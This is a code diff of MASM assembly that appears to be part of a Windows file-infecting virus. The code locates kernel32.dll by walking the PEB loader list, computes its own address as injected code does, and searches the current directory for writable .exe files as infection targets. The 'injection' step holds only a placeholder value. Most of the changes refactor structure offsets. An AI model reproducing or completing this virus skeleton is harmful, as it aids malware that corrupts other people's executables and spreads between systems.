@@ -10,25 +10,29 @@
 option casemap:none
 
       include \masm32\include\windows.inc
+      include \masm32\include\wdm.inc
       include \masm32\include\kernel32.inc
+	  include .\yharnam.inc
 
       includelib \masm32\lib\kernel32.lib
 
 .data
-
+	; helper variable, only for syntax purposes,
+	; to move within a structure without naming the first element
+	cStruct             DWORD 0
 .code
 
 data:
-	fileFilter  		BYTE ".\*.exe",0
-	returnAddr			DWORD 000000000h
-	stackSize			DWORD ((sizeof BYTE * MAX_PATH * 2) + \
+	fileFilter          BYTE ".\*.exe",0
+	returnAddr          DWORD 000000000h
+	stackSize           DWORD ((sizeof BYTE * MAX_PATH * 2) + \
 							  sizeof WIN32_FIND_DATA + \
 							  sizeof HANDLE)
-; offsets to the stack pointer
-	currentExe			DWORD 0
-	targetName			DWORD (sizeof BYTE * MAX_PATH)
-	fileStruct	 		DWORD (sizeof BYTE * MAX_PATH * 2)
-	fileSearchHandle	DWORD (sizeof BYTE * MAX_PATH * 2 + sizeof WIN32_FIND_DATA)
+	; offsets to the stack pointer
+	currentExe          DWORD 0
+	targetName          DWORD (sizeof BYTE * MAX_PATH)
+	fileStruct          DWORD (sizeof BYTE * MAX_PATH * 2)
+	fileSearchHandle    DWORD (sizeof BYTE * MAX_PATH * 2 + sizeof WIN32_FIND_DATA)
 
 start:
 	call _getAddr_ ; get the injected .exe's environment instruction pointer
@@ -43,14 +47,11 @@ _getAddr_:
 	ASSUME FS:NOTHING
 	mov edx, fs:[030h] ; get the PEB struct
 	ASSUME FS:ERROR
+	
 	; ->Ldr / get the PEB_LDR_DATA struct
-	mov edx, [edx + (sizeof BYTE*2 + \   ; Reserved1
-					 sizeof BYTE + \     ; BeingDebugged
-					 sizeof BYTE*1 + \   ; Reserved2
-					 sizeof PVOID*2)]    ; Reserved3
+	mov edx, (PEB PTR [edx]).Ldr
 	; ->InMemoryOrderModuleList / gets the loaded modules linked list
-	mov edx, [edx + (sizeof BYTE*8 + \   ; Reserved1
-					 sizeof PVOID*3)]    ; Reserved2
+	add edx, (cStruct.PEB_LDR_DATA.InMemoryOrderModuleList - cStruct.PEB_LDR_DATA)
 
 	; loop through the linked list until we match with "KERNEL32.DLL"
 	; partial check : length=12; name[0]=K; name[5]=L; name[7]=2
@@ -58,12 +59,7 @@ _getAddr_:
 loop_find_kernel32:
 	; ->FullDllName / get the UNICODE_STRING struct
 	mov eax, edx
-	add eax, (sizeof PVOID*2 + \  ; Reserved1
-			  sizeof PVOID*2 + \  ; InMemoryOrderLinks
-			  sizeof PVOID*2 + \  ; Reserved2
-			  sizeof PVOID + \    ; DllBase
-			  sizeof PVOID + \    ; EntryPoint
-			  sizeof PVOID)       ; Reserved3
+	add eax, (cStruct.LDR_DATA_TABLE_ENTRY.FullDllName - cStruct.LDR_DATA_TABLE_ENTRY)
 	; ->Length
 	mov bx, [eax]
 	; check the length
@@ -71,8 +67,8 @@ loop_find_kernel32:
 	jne loop_find_kernel32_continue
 
 	; ->Buffer
-	mov eax, [eax + (sizeof USHORT + \ ; Length
-	                 sizeof USHORT)]   ; MaximumLength
+	mov eax, (UNICODE_STRING PTR [eax]).Buffer
+
 	; check the string
 	mov bx, [eax]
 	cmp bx, 'K'
@@ -86,13 +82,11 @@ loop_find_kernel32:
 	jmp loop_find_kernel32_end
 loop_find_kernel32_continue:
 	; (LIST_ENTRY)->Flink / get next loaded module
-	mov edx, [edx]
+	mov edx, (LIST_ENTRY PTR [edx]).Flink
 	jmp loop_find_kernel32
 loop_find_kernel32_end:
-	; get kernel32 base address
-	mov edx, [edx + (sizeof PVOID*2 + \ ; Reserved1
-	                 sizeof PVOID*2 + \ ; InMemoryOrderLinks
-					 sizeof PVOID*2)]   ; Reserved2
+	; ->DllBase / get kernel32 base address
+	mov edx, (LDR_DATA_TABLE_ENTRY PTR [edx]).DllBase
 	
 	pop ebx
 	; allocate space on the stack
@@ -129,13 +123,13 @@ loop_find_file:
 	push MAX_PATH
 	mov edx, eax
 	add edx, [ebx + (fileStruct - data)]
-	add edx, (fileStruct.WIN32_FIND_DATA.cFileName - fileStruct.WIN32_FIND_DATA)
+	add edx, (cStruct.WIN32_FIND_DATA.cFileName - cStruct.WIN32_FIND_DATA)
 	push edx
 	call GetFullPathName ; get absolute file path
 	
 	mov edx, esp ; check if it's a directory
 	add edx, [ebx + (fileStruct - data)]
-	mov edx, [edx + (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)]
+	mov edx, [edx + (cStruct.WIN32_FIND_DATA.dwFileAttributes - cStruct.WIN32_FIND_DATA)]
 	and edx, FILE_ATTRIBUTE_DIRECTORY
 	cmp edx, FILE_ATTRIBUTE_DIRECTORY
 	je loop_find_file_continue
@@ -153,12 +147,14 @@ loop_find_file:
 
 	mov edx, esp ; check if it's a read-only file
 	add edx, [ebx + (fileStruct - data)]
-	mov edx, [edx + (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)]
+	mov edx, [edx + (cStruct.WIN32_FIND_DATA.dwFileAttributes - cStruct.WIN32_FIND_DATA)]
 	and edx, FILE_ATTRIBUTE_READONLY
 	cmp edx, FILE_ATTRIBUTE_READONLY
 	je loop_find_file_continue
 
 ;	injection
+	push 0AABBCCDDh
+	pop eax
 ;
 
 loop_find_file_continue:
